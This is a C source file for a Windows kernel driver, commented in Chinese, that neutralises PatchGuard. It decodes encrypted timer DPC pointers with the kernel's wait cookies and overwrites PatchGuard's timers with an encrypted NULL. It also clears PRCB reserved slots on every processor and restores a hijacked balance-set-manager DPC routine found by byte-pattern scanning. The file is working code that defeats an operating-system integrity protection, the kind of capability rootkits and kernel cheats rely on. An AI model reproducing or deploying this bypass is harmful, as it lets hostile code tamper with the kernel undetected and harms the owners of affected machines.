#include "Bypass.h"
#include "DpcState.h"

static ULONG_PTR EncodeTimerDpcNull(
    _In_ PKTIMER Timer,
    _In_ BOOLEAN FullModelUsed)
{
    // 完整 Cookie 模型: Enc(NULL) = rotr64(bswap64(KiWaitAlways) ^ Timer, (UCHAR)KiWaitNever) ^ KiWaitNever
    if (FullModelUsed && (g_KiWaitAlways != 0 || g_KiWaitNever != 0)) {
        return (ULONG_PTR)_rotr64(
            _byteswap_uint64((ULONG64)g_KiWaitAlways) ^ (ULONG64)(ULONG_PTR)Timer,
            (int)(UCHAR)g_KiWaitNever) ^ g_KiWaitNever;
    }

    // 简单异或模型下 NULL 的密文即异或密钥本身; 系统未加密时为字面 NULL
    return ResolveKiWaitNever();
}

static BOOLEAN IsPatchGuardTimerDpc(_In_ PKDPC Dpc)
{
    if (Dpc == NULL || !MmIsAddressValid(Dpc)) {
        return FALSE;
    }

    __try {
        // 特征 1: Method 0 非规范 DeferredContext (掩码编码上下文)
        PVOID context = Dpc->DeferredContext;
        if (context != NULL && !KernelHelperIsCanonicalAddress(context)) {
            return TRUE;
        }

        // 特征 2: 独立定时器双生轮询例程 (每 2 分钟与孪生例程交替校验内核完整性)
        PVOID routine = Dpc->DeferredRoutine;
        if ((g_CcBcbProfiler != NULL && routine == g_CcBcbProfiler) ||
            (g_CcBcbProfiler2 != NULL && routine == g_CcBcbProfiler2)) {
            return TRUE;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}

    return FALSE;
}

static PVOID ResolveBalanceSetManagerDeferredRoutine(VOID)
{
    if (g_KiBalanceSetManagerDeferredRoutine != NULL) {
        return g_KiBalanceSetManagerDeferredRoutine;
    }

    ULONG kernelSize = 0;
    PVOID kernelBase = KernelHelperGetKernelBase(&kernelSize);
    if (kernelBase == NULL || kernelSize == 0) {
        return NULL;
    }

    ULONG textSectionSize = 0;
    PUCHAR textBase = (PUCHAR)KernelHelperGetSectionAddress(kernelBase, ".text", &textSectionSize);
    PUCHAR scanBase = (textBase != NULL && textSectionSize > 0) ? textBase : (PUCHAR)kernelBase;
    ULONG scanSize = (textBase != NULL && textSectionSize > 0) ? textSectionSize : kernelSize;

    // KiBalanceSetManagerDeferredRoutine 函数序言高精度签名 (IDA Pro 实测 100% 独占唯一匹配)
    //   mov rax, rsp             ; 48 8B C4
    //   mov [rax+8], rbx         ; 48 89 58 08
    //   mov [rax+18h], rsi       ; 48 89 70 18
    //   mov [rax+20h], rdi       ; 48 89 78 20
    //   mov [rax+10h], rdx       ; 48 89 50 10
    //   push r14                 ; 41 56
    //   sub rsp, 160h            ; 48 81 EC [disp32]
    //   mov [rsp+158h], rsp      ; 48 89 A4 24 [disp32]
    //   mov r14, r9              ; 4D 8B F1
    //   mov rsi, r8              ; 49 8B F0
    //   mov rbx, rdx             ; 48 8B DA
    //   mov rdi, rcx             ; 48 8B F9
    //   xor edx, edx             ; 33 D2
    //   lea r8d, [rdx+5Fh]       ; 44 8D 42 5F
    const UCHAR deferPattern[] = {
        0x48, 0x8B, 0xC4,
        0x48, 0x89, 0x58, 0x08,
        0x48, 0x89, 0x70, 0x18,
        0x48, 0x89, 0x78, 0x20,
        0x48, 0x89, 0x50, 0x10,
        0x41, 0x56,
        0x48, 0x81, 0xEC, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x89, 0xA4, 0x24, 0x00, 0x00, 0x00, 0x00,
        0x4D, 0x8B, 0xF1,
        0x49, 0x8B, 0xF0,
        0x48, 0x8B, 0xDA,
        0x48, 0x8B, 0xF9,
        0x33, 0xD2,
        0x44, 0x8D, 0x42, 0x5F
    };
    const char deferMask[] = "xxxxxxxxxxxxxxxxxxxxxxxx????xxxx????xxxxxxxxxxxxxxxxxx";

    PUCHAR matchDefer = KernelHelperFindPattern(scanBase, scanSize, deferPattern, deferMask);
    if (matchDefer == NULL && scanBase != (PUCHAR)kernelBase) {
        matchDefer = KernelHelperFindPattern((PUCHAR)kernelBase, kernelSize, deferPattern, deferMask);
    }

    if (matchDefer != NULL) {
        g_KiBalanceSetManagerDeferredRoutine = (PVOID)matchDefer;
    }

    return g_KiBalanceSetManagerDeferredRoutine;
}

BOOLEAN DpcScannerRestoreBalanceSetManagerDpc(VOID)
{

    if (g_KiBalanceSetManagerPeriodicDpc == NULL) {
        PgReportAction(PgMethod5, PgActionSkipped, "periodic DPC not located");
        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[Method 5] KiBalanceSetManagerPeriodicDpc 特征码未定位, 跳过全局借壳还原\n"));
        return FALSE;
    }

    PVOID legitRoutine = ResolveBalanceSetManagerDeferredRoutine();
    if (legitRoutine == NULL) {
        PgReportAction(PgMethod5, PgActionSkipped, "original routine not located");
        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[Method 5] KiBalanceSetManagerDeferredRoutine 特征码未定位, 跳过全局借壳还原\n"));
        return FALSE;
    }

    PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "[Method 5] 全局借壳还原: PeriodicDpc=%p, 合法例程 KiBalanceSetManagerDeferredRoutine=%p\n",
        g_KiBalanceSetManagerPeriodicDpc, legitRoutine));

    __try {
        PKDPC dpc = g_KiBalanceSetManagerPeriodicDpc;
        if (!MmIsAddressValid(dpc)) {
            PgReportAction(PgMethod5, PgActionFailed, "DPC no longer readable");
            return FALSE;
        }

        PVOID currentRoutine = dpc->DeferredRoutine;
        if (currentRoutine == legitRoutine) {
            PgReportAction(PgMethod5, PgActionNotNeeded, "routine already original; no write performed");
            PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "           -> [  OK  ] DeferredRoutine 本就合法, 未被 PG 改写\n"));
            return TRUE;
        }

        // 原样恢复: 仅回写 DeferredRoutine, 绝不触碰 DeferredContext
        dpc->DeferredRoutine = (PKDEFERRED_ROUTINE)legitRoutine;
        PgReportAction(PgMethod5, PgActionApplied, "original routine pointer written");

        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
            "           -> [CRIT!] 已捕获 PG Method 5 借壳改写 (%p)! DeferredRoutine 已原样还原\n",
            currentRoutine));
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[Method 5] 全局借壳还原过程发生访问违规, 安全中止\n"));
        PgReportAction(PgMethod5, PgActionFailed, "access exception during operation");
        return FALSE;
    }
}

VOID DpcScannerNeutralizeAllProcessors(VOID)
{
    // 前置解析: 加密 Cookie 与独立轮询孪生例程入口
    ResolveKiWaitCookies();
    ResolveCcBcbProfiler();
    ResolveCcBcbProfiler2();

    PDYNAMIC_OFFSETS offsets = KernelHelperGetOffsets();
    ULONG totalCpus = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);

    ULONG clearedTimers = 0;
    ULONG clearedPrcbSlots = 0;
    ULONG visitedTimers = 0;

    PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "\n==================== [DpcScanner 主动清空 (Neutralization) 开始] ====================\n"
        "[DpcScanner] 处置范围: Method 0 掩码定时器 / CcBcbProfiler 独立轮询 / PRCB 保留槽位 (Method 1 & 2)\n"));

    if (offsets == NULL || offsets->PrcbTimerTable == 0) {
        PgReportAction(PgMethod0, PgActionSkipped, "timer table offset unavailable");
        PgReportAction(PgMethod1, PgActionSkipped, "timer table offset unavailable");
        PgReportAction(PgMethod2, PgActionSkipped, "timer table offset unavailable");
        PgReportAction(PgIndependentTimer, PgActionSkipped, "timer table offset unavailable");
        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[DpcScanner] PRCB 定时器表偏移未初始化, 中止主动清空\n"));
        return;
    }

    // PRCB 解析 (与 DpcScannerScanAllProcessors 共享): 免亲和切换, 纯内存写
    ResolvePrcbAddressRoutine();
    if (g_KeQueryPrcbAddress == NULL) {
        PgReportAction(PgMethod0, PgActionSkipped, "PrcbAddress resolver unavailable");
        PgReportAction(PgMethod1, PgActionSkipped, "PrcbAddress resolver unavailable");
        PgReportAction(PgMethod2, PgActionSkipped, "PrcbAddress resolver unavailable");
        PgReportAction(PgIndependentTimer, PgActionSkipped, "PrcbAddress resolver unavailable");
        PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
            "[DpcScanner] KeQueryPrcbAddress 不可用, 中止主动清空\n"));
        return;
    }

    for (ULONG i = 0; i < totalCpus; i++) {
        PUCHAR prcb = (PUCHAR)g_KeQueryPrcbAddress(i);
        if (prcb == NULL || !KernelHelperIsPageValidCached(prcb)) {
            PgReportTimerScopeSkip(1, "PRCB pointer unavailable; operation scope incomplete");
            continue;
        }

        // ---- 1. PRCB 保留槽位清空 (Method 1 & 2) ----
        PULONG64 halReserved = (PULONG64)(prcb + KPRCB_HAL_RESERVED_OFFSET);
        PVOID* acpiReserved = (PVOID*)(prcb + KPRCB_ACPI_RESERVED_OFFSET);

        if (halReserved[7] != 0) {
            PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "  [CRIT!] [CPU %02u] KPRCB.HalReserved[7] = %016llX [Method 1 锚点非空] -> 已强制置 NULL\n",
                i, (unsigned long long)halReserved[7]));
            InterlockedExchange64((volatile LONG64*)&halReserved[7], 0);
            PgReportAction(PgMethod1, PgActionApplied, "original PRCB slot operation applied");
            clearedPrcbSlots++;
        }

        if (*acpiReserved != NULL) {
            PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "  [CRIT!] [CPU %02u] KPRCB.AcpiReserved = %p [Method 2 锚点非空] -> 已强制置 NULL\n",
                i, *acpiReserved));
            InterlockedExchangePointer(acpiReserved, NULL);
            PgReportAction(PgMethod2, PgActionApplied, "original PRCB slot operation applied");
            clearedPrcbSlots++;
        }

        // ---- 2. 定时器表遍历: Method 0 与 CcBcbProfiler 独立轮询 Dpc 置空 ----
        PMY_KTIMER_TABLE timerTable = (PMY_KTIMER_TABLE)(prcb + offsets->PrcbTimerTable);

        for (ULONG hand = 0; hand < 2; hand++) {
            for (ULONG bucket = 0; bucket < 256; bucket++) {
                PLIST_ENTRY head = &timerTable->TimerEntries[hand][bucket].Entry;
                // 空桶快跳 (同 DpcScanner): 先读 Flink, 非空才校验 head
                if (head->Flink == head) {
                    continue;
                }

                if (!KernelHelperIsPageValidCached(head)) {
                    PgReportTimerScopeSkip(1, "timer bucket unreadable; operation scope incomplete");
                    continue;
                }
                if (head->Blink == head) {
                    continue; // 并发撕裂
                }

                // 校验双向循环链表结构自洽性 (防越界与结构畸变)
                if (!KernelHelperIsPageValidCached(head->Flink) || !KernelHelperIsPageValidCached(head->Blink)) {
                    PgReportTimerScopeSkip(1, "timer link unreadable; operation scope incomplete");
                    continue;
                }
                if (head->Flink->Blink != head || head->Blink->Flink != head) {
                    PgReportTimerScopeSkip(1, "timer chain inconsistent; operation scope incomplete");
                    continue;
                }

                PLIST_ENTRY curr = head->Flink;

                ULONG chainFuse = 0;
                while (curr != head && curr != NULL && KernelHelperIsPageValidCached(curr) && chainFuse++ < 1000000) {
                    PKTIMER timer = CONTAINING_RECORD(curr, KTIMER, TimerListEntry);
                    if (!KernelHelperIsPageValidCached(timer)) {
                    PgReportTimerScopeSkip(1, "timer object unreadable; operation scope incomplete");
                        break;
                    }

                    visitedTimers++;

                    if ((ULONG_PTR)timer->Dpc != 0) {
                        BOOLEAN fullModel = FALSE;
                        PKDPC realDpc = DecodeTimerDpc(timer, &fullModel);
                        PgReportTimerScopeSkip(realDpc == NULL, "timer DPC not decoded/readable; operation scope incomplete");

                        if (realDpc != NULL && IsPatchGuardTimerDpc(realDpc)) {
                            // 写入 "NULL 的密文": 派发侧解密为 NULL 后将静默跳过该定时器
                            ULONG_PTR encNull = EncodeTimerDpcNull(timer, fullModel);

                            PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                                "  [CRIT!] [CPU %02u] 定时器 %p 命中 PG 特征 (Routine: %p, Context: %p)\n"
                                "          -> Dpc 密文已原子置为加密 NULL (%016llX), 该定时器 DPC 将被永久静默\n",
                                i, timer, realDpc->DeferredRoutine, realDpc->DeferredContext,
                                (unsigned long long)encNull));

                            InterlockedExchange64((volatile LONG64*)&timer->Dpc, (LONG64)encNull);
                            PgReportTimerAction(realDpc->DeferredRoutine, g_CcBcbProfiler, g_CcBcbProfiler2);
                            clearedTimers++;
                        }
                    }

                    curr = curr->Flink;
                }
                PgReportTimerScopeSkip(curr != head, "timer chain interrupted");
            }
        }
    }

    PgTrace((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "  [%s] 主动清空完成: 遍历定时器 %u 个 | 置空 PG 定时器 Dpc %u 个 | 强制清空 PRCB 保留槽位 %u 处\n"
        "==================== [DpcScanner 主动清空结束] ====================\n\n",
        (clearedTimers > 0 || clearedPrcbSlots > 0) ? "CRIT!" : "  OK  ",
        visitedTimers, clearedTimers, clearedPrcbSlots));
}
